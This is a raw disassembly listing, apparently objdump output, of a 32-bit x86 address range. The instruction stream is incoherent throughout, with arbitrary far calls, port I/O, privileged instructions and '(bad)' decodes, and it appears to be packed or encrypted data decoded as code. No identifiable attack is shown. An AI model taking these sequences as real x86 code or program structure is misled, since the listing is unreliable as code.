  40371f:	aaa    
  403720:	cwde   
  403721:	sti    
  403722:	cmp    dl,BYTE PTR [ebx+0x2cb35b2]
  403728:	leave  
  403729:	imul   edx,DWORD PTR [ebx-0xf188d80],0xd4a70081
  403733:	sahf   
  403734:	mov    dl,0x6c
  403736:	test   eax,0x4e41952
  40373b:	out    dx,eax
  40373c:	mov    dl,0x44
  40373e:	mov    eax,ds:0x675bed22
  403743:	stc    
  403744:	push   ecx
  403745:	or     edx,DWORD PTR [eax]
  403747:	sub    al,0x66
  403749:	ins    BYTE PTR es:[edi],dx
  40374a:	cmc    
  40374b:	les    esp,FWORD PTR [edx+0x3e]
  40374e:	call   0x9f17:0xe5214bcd
  403755:	mov    ecx,0x3410a7ae
  40375a:	jge    0x403747
  40375c:	push   edi
  40375d:	mov    bh,BYTE PTR [ecx-0x7d]
  403760:	mov    dl,0xd0
  403762:	sbb    cl,BYTE PTR [ecx+0x60]
  403765:	sub    cl,bh
  403767:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403768:	jae    0x40377f
  40376a:	and    al,0xfa
  40376c:	push   esp
  40376d:	or     eax,DWORD PTR [esi+0x60]
  403770:	rcr    BYTE PTR [ecx+0x2b],0x24
  403774:	mov    dl,0xa5
  403776:	idiv   BYTE PTR [edx]
  403778:	(bad)  
  40377a:	and    DWORD PTR [ecx-0x4d14f327],eax
  403780:	ja     0x4037cc
  403782:	jl     0x4037ab
  403784:	arpl   WORD PTR [ecx+edx*1],cx
  403787:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403788:	mov    ch,0xf2
  40378a:	mov    BYTE PTR [ebx+esi*4],bh
  40378d:	fmulp  st(2),st
  40378f:	or     ecx,0x8aa70bb6
  403795:	jg     0x4037e2
  403797:	cmp    DWORD PTR [esi-0x55],ecx
  40379a:	fcom   QWORD PTR [edi]
  40379c:	mov    dl,0xa4
  40379e:	fist   DWORD PTR [eax+edi*4]
  4037a1:	iret   
  4037a2:	fbstp  TBYTE PTR [edx]
  4037a4:	ud2    
  4037a6:	repz ret 
  4037a8:	xchg   BYTE PTR [edi+ebp*4-0x79],bh
  4037ac:	jnp    0x40375f
  4037ae:	in     al,0xf5
  4037b0:	jb     0x403797
  4037b2:	sub    eax,0x1e2e290d
  4037b7:	inc    ebx
  4037b8:	in     al,dx
  4037b9:	or     esp,DWORD PTR ds:0x968d74e1
  4037bf:	and    dh,BYTE PTR [ecx+0x1e40a278]
  4037c5:	mov    eax,ebx
  4037c7:	sbb    bl,BYTE PTR [ebx-0x2b]
  4037ca:	stc    
  4037cb:	jmp    0x24d9:0x19260b84
  4037d2:	ror    ebx,1
  4037d4:	adc    edi,ecx
  4037d6:	call   0x10f6:0xe8695f66
  4037dd:	out    dx,eax
  4037de:	dec    ecx
  4037df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4037e0:	sbb    edx,eax
  4037e2:	xchg   ebx,eax
  4037e3:	cdq    
  4037e4:	and    BYTE PTR [ecx+0x1c],cl
  4037e7:	push   ss
  4037e8:	mov    WORD PTR [eax+0x21822700],?
  4037ee:	push   es
  4037ef:	adc    esp,DWORD PTR es:[edx]
  4037f2:	cmp    al,0x4f
  4037f4:	adc    eax,0xed5b310b
  4037f9:	push   0x36237b5c
  4037fe:	out    dx,al
  4037ff:	cmp    dh,BYTE PTR [edx+0x3f86fbc1]
  403805:	fisttp QWORD PTR [edx+0x433358b8]
  40380b:	fdiv   QWORD PTR [eax+0x2e24fab0]
  403811:	mov    dl,0xda
  403813:	lds    esp,FWORD PTR [ebp-0xb4a7b20]
  403819:	es pop edx
  40381b:	cld    
  40381c:	push   ecx
  40381d:	outs   dx,DWORD PTR ds:[esi]
  40381e:	ret    0xc021
  403821:	xor    esi,DWORD PTR [ebp+ebp*1-0x38]
  403825:	or     ecx,DWORD PTR [esi-0x7d]
  403828:	stos   DWORD PTR es:[edi],eax
  403829:	and    al,0xaa
  40382b:	adc    BYTE PTR [edi+0x59],dh
  40382e:	call   0x70e7:0x8a99441c
  403835:	inc    eax
  403836:	or     DWORD PTR [edi-0x730d7291],esp
  40383c:	imul   edx,DWORD PTR [eax+edi*4-0x10c369a1],0xfffffff1
  403844:	mov    dl,0x30
  403846:	pop    ebp
  403847:	sub    bh,cl
  403849:	test   eax,0x3574a7ff
  40384e:	xchg   DWORD PTR [eax],esp
  403850:	cld    
  403851:	mov    DWORD PTR [eax],esi
  403853:	ins    DWORD PTR es:[edi],dx
  403854:	retf   0x9a4f
  403857:	stos   DWORD PTR es:[edi],eax
  403858:	mov    ebp,0x31e7b7ab
  40385d:	retf   0xa76c
  403860:	sbb    DWORD PTR [ebp+0x7a8f7b1f],esi
  403866:	jno    0x4038bb
  403868:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403869:	xchg   ebp,eax
  40386a:	iret   
  40386b:	fdiv   QWORD PTR [edx-0xb79cffc]
  403871:	clc    
  403872:	cmp    al,0xa5
  403874:	(bad)  
  403875:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403876:	rol    edi,cl
  403878:	sbb    ebp,ecx
  40387a:	pop    edx
  40387b:	pusha  
  40387c:	add    al,0x2e
  40387e:	sahf   
  40387f:	test   al,0xd9
  403881:	jno    0x4038db
  403883:	cmp    dh,BYTE PTR [edx]
  403885:	sub    dl,ch
  403887:	pop    esi
  403888:	loop   0x403895
  40388a:	into   
  40388b:	jle    0x4038b0
  40388d:	sbb    al,0x2e
  40388f:	dec    edi
  403890:	inc    ebx
  403891:	pushf  
  403892:	cmp    al,BYTE PTR [edx]
  403894:	sbb    BYTE PTR [edx+ebx*4+0x3f],0xbf
  403899:	enter  0xe32,0x0
  40389d:	push   esi
  40389e:	stc    
  40389f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038a0:	scas   al,BYTE PTR es:[edi]
  4038a1:	dec    ebp
  4038a2:	mov    ebx,0x6a7acfd4
  4038a7:	add    bl,bh
  4038a9:	sahf   
  4038aa:	and    cl,BYTE PTR [ebp-0x4e]
  4038ad:	mov    cl,0xaf
  4038af:	test   eax,0x2037d0d7
  4038b4:	test   DWORD PTR [ebx],ecx
  4038b6:	and    DWORD PTR [ebx+0x685cd126],0x379aba3b
  4038c0:	dec    ebx
  4038c1:	out    dx,al
  4038c2:	mov    edi,0xf8d38b24
  4038c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038c8:	gs inc esi
  4038ca:	ret    
  4038cb:	xor    ecx,esp
  4038cd:	gs inc ebp
  4038cf:	pop    ebx
  4038d0:	mov    dl,0x5
  4038d2:	xchg   ebx,eax
  4038d3:	fcmovnbe st,st(5)
  4038d5:	in     eax,dx
  4038d6:	sub    al,0xa6
  4038d8:	mov    ah,0xa
  4038da:	push   esp
  4038db:	jns    0x403879
  4038dd:	scas   al,BYTE PTR es:[edi]
  4038de:	mov    ebx,0x7a6b1d25
  4038e3:	fidiv  DWORD PTR [edx+0x369be6dc]
  4038e9:	sbb    DWORD PTR [ecx],ecx
  4038eb:	mul    BYTE PTR [ebx+0xb]
  4038ee:	adc    ebx,eax
  4038f0:	mov    dh,0x25
  4038f2:	adc    BYTE PTR [edx],ch
  4038f4:	xchg   ebx,eax
  4038f5:	ret    
  4038f6:	xchg   esp,eax
  4038f7:	xor    esp,DWORD PTR [edi]
  4038f9:	retf   
  4038fa:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4038fc:	in     eax,0x97
  4038fe:	in     al,0x52
  403900:	mov    ebx,0x2015130b
  403905:	pop    eax
  403906:	or     DWORD PTR [esi+0x50],edi
  403909:	retf   0x9a
  40390c:	leave  
  40390d:	mov    ds:0xf05bf1ec,al
  403912:	nop
  403913:	(bad)  [ebx]
  403915:	or     al,0x9c
  403917:	loope  0x40393b
  403919:	dec    esp
  40391a:	or     eax,0x88f35057
  40391f:	inc    eax
  403920:	mov    dl,0x6d
  403922:	adc    bl,BYTE PTR [ecx]
  403924:	jae    0x403997
  403926:	push   edx
  403927:	nop
  403928:	mov    edx,0x19a600b
  40392d:	shl    DWORD PTR [ebx+ebp*4],cl
  403930:	xchg   ebx,eax
  403931:	mov    ebx,0x6e81fb9a
  403936:	mov    eax,0x846fc15b
  40393b:	test   eax,0x6facfedc
  403940:	lods   eax,DWORD PTR ds:[esi]
  403941:	or     ebx,DWORD PTR [eax+eax*1]
  403944:	stos   BYTE PTR es:[edi],al
  403945:	mov    dh,0x89
  403948:	mov    dl,0x71
  40394a:	sub    ah,dh
  40394c:	xor    BYTE PTR [ecx],bh
  40394e:	push   0xffffffd2
  403950:	retf   0x3408
  403953:	and    BYTE PTR [ebp+0xf],ah
  403956:	ds xchg esp,eax
  403958:	jb     0x4039d0
  40395a:	icebp  
  40395b:	xor    eax,0xce52ecbb
  403960:	xor    ecx,DWORD PTR [ebx]
  403962:	fild   DWORD PTR [ebx+0xb]
  403965:	repz dec esi
  403967:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403968:	shl    DWORD PTR [ebp-0x67],0x51
  40396c:	cs push 0x7eb28d87
  403972:	or     DWORD PTR [edi],ebp
  403974:	jle    0x4039ca
  403976:	or     BYTE PTR [esi+0x79],ah
  403979:	add    al,0x7
  40397b:	push   esp
  40397c:	outs   dx,BYTE PTR ds:[esi]
  40397d:	loop   0x4039b8
  40397f:	push   es
  403980:	cs pop ecx
  403982:	and    dl,BYTE PTR [ecx+eax*1-0x2bbd3d65]
  403989:	or     edx,eax
  40398b:	push   ebp
  40398c:	mov    edx,0x55d23fb0
  403991:	ss ret 
  403993:	jecxz  0x403945
  403995:	cwde   
  403996:	aad    0xeb
  403998:	(bad)  [eax]
  40399a:	cli    
  40399b:	(bad)
  40399f:	jne    0x4039da
  4039a1:	hlt    
  4039a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039a3:	mov    ds:0x4d38d064,eax
  4039a8:	push   ss
  4039a9:	or     ebp,ebx
  4039ab:	jp     0x4039b8
  4039ad:	int3   
  4039ae:	fld    DWORD PTR [edx+0x5199d767]
  4039b4:	jg     0x40399f
  4039b6:	adc    eax,0x98b869d0
  4039bb:	sub    dl,ah
  4039bd:	pop    ebx
  4039be:	pop    esp
  4039bf:	cmp    DWORD PTR [eax+ecx*1-0x5bbf4a10],edi
  4039c6:	xor    DWORD PTR [edi+0x4022ac42],0x3bb5f0bc
  4039d0:	frstor [ebp+0x4f]
  4039d3:	xchg   DWORD PTR [eax+0x2acfd4b7],esp
  4039d9:	or     ecx,esi
  4039db:	dec    ebx
  4039dc:	sti    
  4039dd:	pop    ebx
  4039de:	jp     0x4039a1
  4039e0:	jge    0x4039ff
  4039e2:	cdq    
  4039e3:	enter  0x9e95,0xf4
  4039e7:	dec    edi
  4039e8:	(bad)  
  4039e9:	sti    
  4039ea:	inc    esp
  4039eb:	bound  ebp,QWORD PTR [edx]
  4039ed:	or     ebx,DWORD PTR ds:0xc88f069c
  4039f3:	lahf   
  4039f4:	mov    esi,0xa3399ad6
  4039f9:	inc    esp
  4039fa:	pop    esi
  4039fb:	pop    edi
  4039fc:	inc    edx
  4039fd:	aaa    
  4039fe:	sub    BYTE PTR [edi-0x2ffe7c4a],ah
  403a04:	leave  
  403a05:	mov    ebp,0xecb29678
  403a0a:	cmp    edi,DWORD PTR [esi]
  403a0c:	push   0x313a69c6
  403a11:	cmp    eax,DWORD PTR [edx-0x21]
  403a14:	mov    ah,0x1d
  403a16:	push   esi
  403a18:	mov    dl,0x7b
  403a1a:	mov    bh,0x4d
  403a1c:	inc    ebx
  403a1d:	out    dx,eax
  403a1e:	arpl   WORD PTR [eax],bx
  403a20:	popf   
  403a21:	or     esi,DWORD PTR [ecx-0x45cffc0e]
  403a27:	sbb    dl,BYTE PTR [eax-0x4d1b97ca]
  403a2d:	xchg   al,al
  403a2f:	mov    dl,0xa
  403a31:	js     0x403a24
  403a33:	jbe    0x4039db
  403a35:	or     edi,DWORD PTR [ebp+0x57]
  403a38:	scas   eax,DWORD PTR es:[edi]
  403a39:	sub    eax,0x9312ce0b
  403a3e:	call   0x67ea:0xe3c5d71
  403a45:	daa    
  403a46:	arpl   WORD PTR [edi-0x46386923],sp
  403a4c:	pop    esi
  403a4d:	addr16 jo 0x4039f3
  403a50:	mov    dl,0x8b
  403a52:	or     eax,0xbc79b8cf
  403a57:	push   0x7401006d
  403a5c:	dec    esp
  403a5d:	fst    QWORD PTR [esi+edx*4]
  403a60:	push   edx
  403a61:	xor    ch,BYTE PTR ds:0x9a705217
  403a67:	xchg   DWORD PTR [ebx-0x3f21e485],ebp
  403a6d:	mov    bl,0xa0
  403a6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403a70:	into   
  403a71:	lods   eax,DWORD PTR ds:[esi]
  403a72:	imul   edi,DWORD PTR [esi-0x70],0x2347bf09
  403a79:	and    bl,BYTE PTR [ecx+0x1b5e7b48]
  403a7f:	mov    ebx,eax
  403a81:	ret    
  403a82:	inc    ecx
  403a83:	retf   
  403a84:	sti    
  403a85:	or     edi,DWORD PTR [ebp-0x46]
  403a88:	sub    DWORD PTR [eax+0x73],esp
  403a8b:	xor    al,0xaa
  403a8d:	mov    esp,0x83c5f687
  403a92:	pop    ebp
  403a93:	or     eax,0x6b1acec1
  403a98:	loope  0x403b08
  403a9a:	fwait
  403a9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a9c:	(bad)  
  403a9e:	ror    eax,cl
  403aa0:	test   DWORD PTR [ebp-0x7a4d05f0],ebp
  403aa6:	std    
  403aa7:	out    0xc6,al
  403aa9:	xchg   BYTE PTR [esi+0x2304c797],dh
  403aaf:	in     al,0x1a
  403ab1:	(bad)  
  403ab2:	call   0xb284:0x9f6a740e
  403ab9:	iret   
  403aba:	push   ss
  403abb:	fistp  DWORD PTR [ebp+0x59]
  403abe:	xchg   DWORD PTR [ebx-0x58fc1810],ebx
  403ac4:	mov    ds:0xa45b5956,al
  403ac9:	xchg   ebp,eax
  403aca:	aaa    
  403acb:	and    al,0xb3
  403acd:	add    eax,0x5db37d1a
  403ad2:	aas    
  403ad3:	out    0x93,eax
  403ad5:	add    BYTE PTR [edx-0x46],cl
  403ad8:	or     BYTE PTR es:[ebx+0x7b],cl
  403adc:	jns    0x403aa5
  403ade:	test   al,0xe3
  403ae0:	push   edx
  403ae1:	ins    BYTE PTR es:[edi],dx
  403ae2:	xchg   BYTE PTR [ebx],ch
  403ae4:	mov    dl,0x32
  403ae6:	not    al
  403ae8:	mov    bl,BYTE PTR [ebx+edi*1+0x2e0b3936]
  403aef:	scas   al,BYTE PTR es:[edi]
  403af0:	add    al,0xad
  403af2:	jp     0x403ae7
  403af4:	ret    
  403af5:	and    ebx,DWORD PTR [edx+0x4f258b14]
  403afb:	mov    eax,0x4ea7c574
  403b01:	xchg   DWORD PTR [eax+ebx*2-0x34],esp
  403b05:	xor    DWORD PTR [ecx],esp
  403b07:	fwait
  403b08:	mov    dl,0xd3
  403b0a:	out    0x56,al
  403b0c:	add    eax,0xc6f4d239
  403b11:	or     esi,DWORD PTR [ebx-0x79207432]
  403b17:	xor    DWORD PTR gs:[ebx+0x4d96086],esp
  403b1e:	les    esp,FWORD PTR [edx+esi*4-0x41]
  403b22:	or     eax,0xdc7df535
  403b27:	mov    eax,0x2700abc3
  403b2c:	je     0x403af9
  403b2e:	sti    
  403b2f:	scas   al,BYTE PTR es:[edi]
  403b30:	add    esi,eax
  403b32:	call   0x7b3b:0x96fc921d
  403b39:	cmp    al,0x2d
  403b3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b3c:	push   es
  403b3d:	push   ecx
  403b3e:	fstp   TBYTE PTR [edi-0x5137dd76]
  403b44:	mov    dl,0x21
  403b46:	pop    ecx
  403b47:	sub    DWORD PTR [ecx+edi*8-0x36],esp
  403b4b:	ror    DWORD PTR ss:[ebx],0x2c
  403b4f:	cdq    
  403b50:	gs in  eax,0xc5
  403b53:	nop
  403b54:	stos   DWORD PTR es:[edi],eax
  403b55:	mov    BYTE PTR [edx-0x295ce17d],bl
  403b5b:	repnz es mov dl,0xb6
  403b5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b60:	add    al,0xbf
  403b62:	rol    DWORD PTR [ebx+0x25],0xba
  403b66:	ins    DWORD PTR es:[edi],dx
  403b67:	fs mov bh,0xb4
  403b6a:	adc    BYTE PTR [ecx-0x2cc56e15],bh
  403b70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b71:	or     BYTE PTR [esi],bl
  403b73:	push   ebp
  403b74:	mov    eax,ds:0x62c6e849
  403b79:	fcomi  st,st(3)
  403b7b:	lods   al,BYTE PTR ds:[esi]
  403b7c:	mov    dl,0x81
  403b7e:	in     eax,0x39
  403b80:	push   cs
  403b81:	and    BYTE PTR [edx],ch
  403b83:	stos   DWORD PTR es:[edi],eax
  403b84:	inc    edx
  403b85:	or     eax,DWORD PTR [edx]
  403b87:	mov    edi,0xc9466b00
  403b8c:	data16 (bad) 
  403b8e:	jle    0x403b21
  403b90:	mov    dl,0x1f
  403b92:	adc    al,0x36
  403b94:	xchg   esi,eax
  403b95:	daa    
  403b96:	push   edx
  403b97:	mov    bh,0xe7
  403b99:	or     edx,eax
  403b9b:	ins    DWORD PTR es:[edi],dx
  403b9c:	xlat   BYTE PTR ds:[ebx]
  403b9d:	fxam   
  403b9f:	mov    esp,0x98d650e3
  403ba4:	jp     0x403bab
  403ba6:	jne    0x403c06
  403ba8:	loope  0x403bb5
  403baa:	stc    
  403bab:	sbb    DWORD PTR [ebx+0x7aa7911f],esp
  403bb1:	pop    edi
  403bb2:	ret    0xccf7
  403bb5:	stos   DWORD PTR es:[edi],eax
  403bb6:	mov    esp,0x769202e7
  403bbb:	ins    DWORD PTR es:[edi],dx
  403bbc:	mov    dl,0x60
  403bbe:	fidiv  WORD PTR [esi]
  403bc0:	psubsw mm4,QWORD PTR [edi-0x51f7590b]
  403bc7:	lds    esi,FWORD PTR [esi+0x58]
  403bca:	in     eax,dx
  403bcb:	call   0x3eb4d8fa
  403bd0:	mov    dl,0xcc
  403bd2:	sub    eax,0xcc98cf37
  403bd7:	dec    ebx
  403bd8:	pop    ss
  403bd9:	or     edx,DWORD PTR [edi]
  403bdb:	loop   0x403c21
  403bdd:	arpl   WORD PTR [edx+edi*4-0x1b6af96a],bp
  403be4:	(bad)  
  403be5:	fsubr  DWORD PTR [edi-0x19]
  403be8:	pcmpgtw mm1,mm7
  403beb:	jge    0x403c08
  403bed:	or     BYTE PTR [eax-0x464635f5],bl
  403bf3:	stc    
  403bf4:	or     al,BYTE PTR [ecx]
  403bf6:	scas   eax,DWORD PTR es:[edi]
  403bf7:	mov    WORD PTR [edx+0x117b7134],?
  403bfd:	ret    
  403bfe:	call   0xb64c02d5
  403c03:	test   ebx,ebx
  403c05:	int3   
  403c06:	jg     0x403c11
  403c08:	pop    ebx
  403c09:	stc    
  403c0a:	call   0xef2b:0x63048211
  403c11:	out    0xf,al
  403c13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c14:	pushf  
  403c15:	xor    eax,0x272d9d99
  403c1a:	and    eax,0xdff1aff5
  403c1f:	jmp    0x95640c16
  403c24:	sub    edi,0x2fe6a726
  403c2a:	das    
  403c2b:	mov    ecx,0xfddc653d
  403c30:	mov    cl,0xff
  403c32:	jo     0x403c68
  403c34:	pop    ecx
  403c35:	inc    ebx
  403c36:	stos   BYTE PTR es:[edi],al
  403c37:	ja     0x403bdf
  403c39:	and    DWORD PTR [edi-0x59],0x7
  403c3d:	daa    
  403c3e:	xchg   ebp,eax
  403c3f:	pop    esp
  403c40:	leave  
  403c41:	xchg   ebx,eax
  403c42:	test   eax,0x3c7dadf0
  403c47:	sub    ebp,esi
  403c49:	sbb    dl,BYTE PTR ds:0xaafb528e
  403c4f:	ins    DWORD PTR es:[edi],dx
  403c50:	jbe    0x403c5d
  403c52:	cmc    
  403c53:	scas   al,BYTE PTR es:[edi]
  403c54:	adc    ebx,edx
  403c56:	pop    ebx
  403c57:	js     0x403c86
  403c59:	pop    edi
  403c5a:	xchg   DWORD PTR [ecx],ebp
  403c5c:	or     al,0x16
  403c5e:	sbb    bh,BYTE PTR [ecx+0x4bbc595b]
  403c64:	daa    
  403c65:	or     ebx,DWORD PTR [eax+0x46ae9628]
  403c6b:	mov    ds:0xeae1307f,eax
  403c70:	mov    dl,0x96
  403c72:	push   ss
  403c73:	push   ds
  403c74:	inc    esp
  403c75:	jp     0x403bf9
  403c77:	jbe    0x403c05
  403c79:	or     BYTE PTR [edx+eiz*4],dh
  403c7c:	inc    eax
  403c7d:	push   ecx
  403c7e:	jb     0x403c02
  403c80:	push   edx
  403c81:	adc    edi,edx
  403c83:	pusha  
  403c84:	mov    dl,0x4e
  403c86:	(bad)  
  403c87:	in     eax,dx
  403c88:	jo     0x403c8f
  403c8a:	lods   eax,DWORD PTR ds:[esi]
  403c8b:	add    edx,DWORD PTR [eax]
  403c8d:	xor    al,0x2e
  403c8f:	lods   eax,DWORD PTR ds:[esi]
  403c90:	xor    bh,BYTE PTR [ecx-0x2b]
  403c93:	sbb    al,0x3e
  403c95:	call   0x7e9a:0x805278e1
  403c9c:	mov    cl,0x39
  403c9e:	mov    WORD PTR ds:0xa72ad59e,ds
  403ca4:	xchg   BYTE PTR [edx+0x1e],dh
  403ca7:	pop    esi
  403ca8:	add    DWORD PTR [edi+0x7c],esp
  403cab:	cs mov dl,0xa1
  403cae:	fs push ss
  403cb0:	mov    ch,0x6e
  403cb2:	(bad)  
  403cb3:	int    0xb6
  403cb5:	or     ecx,edi
  403cb7:	pop    ebp
  403cb8:	mov    edx,0x70eaa0f8
  403cbd:	out    0xeb,al
  403cbf:	push   cs
  403cc0:	mov    cl,0x9c
  403cc2:	add    BYTE PTR [ebx-0x53],0x6
  403cc6:	stos   BYTE PTR es:[edi],al
  403cc7:	pop    edi
  403cc8:	sti    
  403cc9:	outs   dx,BYTE PTR ds:[esi]
  403cca:	stos   DWORD PTR es:[edi],eax
  403ccb:	fisub  WORD PTR [ebx-0x5d3964f5]
  403cd1:	aas    
  403cd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cd3:	js     0x403ce2
  403cd5:	in     al,dx
  403cd6:	test   bh,bh
  403cd8:	in     eax,dx
  403cd9:	xchg   BYTE PTR [edx+0x7784351f],bl
  403cdf:	ror    al,cl
  403ce1:	aaa    
  403ce2:	sbb    ecx,ebx
  403ce4:	mov    dl,0x38
  403ce6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ce7:	ins    BYTE PTR es:[edi],dx
  403ce8:	mov    edi,0xbc43180f
  403ced:	dec    edi
  403cee:	popa   
  403cef:	rcr    DWORD PTR [esi+0x4b],cl
  403cf2:	lock push edi
  403cf4:	push   cs
  403cf5:	mov    edx,0xe47aa7c5
  403cfa:	out    0xee,eax
  403cfc:	ss inc ecx
  403cfe:	adc    DWORD PTR [edi-0x4b],esp
  403d01:	push   esi
  403d02:	icebp  
  403d03:	jl     0x403d28
  403d05:	mov    gs,WORD PTR [edx+0x6db54b25]
  403d0b:	mov    al,ds:0x796a404
  403d10:	les    esi,FWORD PTR ds:0x1774d97a
  403d16:	push   eax
  403d17:	je     0x403cdd
  403d19:	pop    esi
  403d1a:	jle    0x403ccb
  403d1c:	mov    dl,0x14
  403d1e:	xlat   BYTE PTR ds:[ebx]
  403d1f:	fmul   DWORD PTR [ecx+0x20]
  403d22:	add    DWORD PTR [eax+edi*1+0xb],edi
  403d26:	or     eax,0x79f8735a
  403d2b:	and    DWORD PTR [edi],eax
  403d2d:	loope  0x403cc8
  403d2f:	sbb    DWORD PTR [esi+edx*2],edx
  403d32:	sbb    ch,bh
  403d34:	sbb    BYTE PTR [ebx+0x5ade1c5],cl
  403d3a:	push   edx
  403d3b:	or     edi,DWORD PTR [esi+0x2e07fd53]
  403d41:	fwait
  403d42:	data16 rol BYTE PTR [edx-0x6b2650d],1
  403d49:	hlt    
  403d4a:	jg     0x403d8d
  403d4c:	pop    ebp
  403d4d:	inc    DWORD PTR [edx-0x59]
  403d50:	rcl    BYTE PTR [edi],cl
  403d52:	inc    ebx
  403d53:	and    ah,dl
  403d55:	fisubr WORD PTR [ecx-0x33]
  403d58:	mov    dl,0xc9
  403d5a:	aad    0xe7
  403d5c:	mov    ds:0x1dbf9007,eax
  403d61:	add    al,0x7d
  403d63:	jmp    0x4a1ad828
  403d68:	sti    
  403d69:	stos   DWORD PTR es:[edi],eax
  403d6a:	ret    
  403d6b:	xchg   edi,eax
  403d6c:	mov    cl,0x94
  403d6e:	push   edx
  403d6f:	imul   esp,DWORD PTR [ebx+0x1c072a7d],0xffffff9c
  403d76:	fisub  WORD PTR [edi-0xc3d769d]
  403d7c:	pop    edi
  403d7d:	mov    dl,0x7a
  403d7f:	jne    0x403d33
  403d81:	xchg   esi,eax
  403d82:	(bad)  
  403d83:	in     al,0x16
  403d85:	es call 0x87737582
  403d8b:	jge    0x403d40
  403d8d:	in     al,0x99
  403d8f:	iret   
  403d90:	cld    
  403d91:	jp     0x403d7d
  403d93:	xchg   edi,eax
  403d94:	(bad)  
  403d95:	adc    al,0x87
  403d97:	pop    ss
  403d98:	outs   dx,DWORD PTR ds:[esi]
  403d99:	xlat   BYTE PTR ds:[ebx]
  403d9a:	pop    edx
  403d9b:	or     DWORD PTR [edi],ebx
  403d9d:	mov    bl,0xbe
  403d9f:	sbb    al,0xfe
  403da1:	or     eax,ecx
  403da3:	adc    DWORD PTR [ebp-0x13],esi
  403da6:	pop    ecx
  403da7:	push   0x849a8876
  403dac:	pop    edx
  403dad:	dec    edx
  403dae:	fisubr DWORD PTR [esp+ebp*8]
  403db1:	pop    es
  403db2:	push   cs
  403db3:	mov    al,ds:0xb06de737
  403db8:	mov    ebp,DWORD PTR [ebx-0x74aafc67]
  403dbe:	popf   
  403dbf:	and    DWORD PTR [esi+0x7201680d],ecx
  403dc5:	ret    0xcd28
  403dc8:	test   BYTE PTR [ebx],cl
  403dca:	inc    edi
  403dcb:	gs push ebx
  403dcd:	sub    BYTE PTR [ecx],bl
  403dcf:	inc    ebp
  403dd0:	jbe    0x403df9
  403dd2:	jl     0x403dde
  403dd4:	mov    dl,0xb4
  403dd6:	sub    eax,0x52653606
  403ddb:	int3   
  403ddc:	dec    BYTE PTR [ebx]
  403dde:	add    al,0x98
  403de1:	add    ch,BYTE PTR [esi+0x58]
  403de4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403de5:	mov    ds:0x677f389a,eax
  403dea:	repz ret 
  403dec:	popf   
  403ded:	mov    ebx,0xa517a7d6
  403df2:	cmp    al,0xaa
  403df4:	adc    eax,edx
  403df6:	mov    ebp,0x6a5dbc1f
  403dfb:	gs and al,0xcb
  403dfe:	mov    ah,0x28
  403e00:	or     al,0x4c
  403e02:	mov    dl,0xa7
  403e04:	std    
  403e05:	xchg   ebp,esp
  403e07:	lea    edx,[edx]
  403e09:	fs in  al,0x90
  403e0c:	scas   al,BYTE PTR es:[edi]
  403e0d:	in     eax,0x53
  403e0f:	mov    dl,0x32
  403e11:	jno    0x403e37
  403e13:	adc    eax,0xa739f7bf
  403e18:	data16 stos BYTE PTR es:[edi],al
  403e1a:	push   ss
  403e1b:	mov    ah,0xad
  403e1d:	push   esp
  403e1e:	add    ebx,DWORD PTR [eax-0x4e]
  403e21:	or     al,0x76
  403e23:	add    eax,0xbaf008fb
  403e28:	mov    eax,0x9a1ce90e
  403e2d:	push   eax
  403e2e:	repz daa 
  403e30:	sbb    ebp,eax
  403e32:	mov    BYTE PTR [esi],bh
  403e34:	mov    dl,0xd7
  403e36:	lahf   
  403e37:	pop    esp
  403e38:	or     ah,bl
  403e3a:	cld    
  403e3b:	jp     0x403e7d
  403e3d:	or     ebp,DWORD PTR [ebx-0x41]
  403e40:	fbstp  TBYTE PTR [edi-0x1b]
  403e43:	enter  0xe1bd,0x98
  403e47:	sbb    eax,0x57f657f9
  403e4c:	fsub   st(3),st
  403e4e:	jecxz  0x403eb5
  403e50:	ret    0x9c78
  403e53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403e54:	lds    edi,FWORD PTR [esi]
  403e56:	div    DWORD PTR [ecx-0x521650b]
  403e5c:	mov    dl,0x61
  403e5e:	mov    eax,0xd5cb1035
  403e63:	ret    0xb40
  403e66:	stc    
  403e67:	jns    0x403dff
  403e69:	fs jp  0x403e31
  403e6c:	sub    BYTE PTR [esi-0x22b07744],0x9a
  403e73:	jecxz  0x403e1a
  403e75:	cdq    
  403e76:	xchg   edi,eax
  403e77:	fdivrp st(3),st
  403e79:	or     ecx,DWORD PTR [ecx+eax*2-0x6bd6bd3d]
  403e80:	mov    ah,0x95
  403e83:	fcomp  DWORD PTR [esi]
  403e85:	mov    edx,DWORD PTR [esi-0x79]
  403e88:	mov    ebp,0x83210c4c
  403e8d:	or     al,0xc5
  403e8f:	adc    cl,BYTE PTR [eax+0x24]
  403e92:	mov    dl,0xc7
  403e94:	fisub  DWORD PTR [edx]
  403e96:	jmp    0xc6c0:0xc13eb24f
  403e9d:	enter  0xfacd,0x53
  403ea1:	or     ebx,edi
  403ea3:	sub    al,0x8f
  403ea5:	iret   
  403ea6:	push   ebp
  403ea7:	les    eax,FWORD PTR [edx-0x67]
  403eaa:	retf   0x5e6f
  403ead:	ficomp WORD PTR [ebx-0x287a1651]
  403eb3:	xor    ecx,DWORD PTR [eax-0x328fb19c]
  403eb9:	or     esp,DWORD PTR [ebx-0x6c]
  403ebc:	lds    ebx,FWORD PTR [esi]
  403ebe:	test   ecx,ecx
